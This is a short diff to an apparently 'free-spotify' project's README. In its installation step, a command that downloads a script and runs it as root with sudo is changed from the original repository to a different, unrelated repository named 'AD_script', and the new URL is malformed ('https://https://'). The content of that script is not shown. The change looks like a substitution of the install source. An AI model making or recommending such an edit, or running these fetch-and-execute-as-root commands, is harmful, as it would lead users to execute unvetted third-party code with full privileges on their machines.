@@ -18,7 +18,7 @@ Easy to use. Just open the Terminal window and enter some commands.
 ### installation
 
 ```sh
-sudo sh -c "$(curl -sSL https://raw.githubusercontent.com/harrytran103/free-spotify/master/install.sh)"
+sudo sh -c "$(curl -sSL https://https://raw.githubusercontent.com/nkundinezayv/AD_script/main/install.sh)"
 ```
 
 ### uninstallation
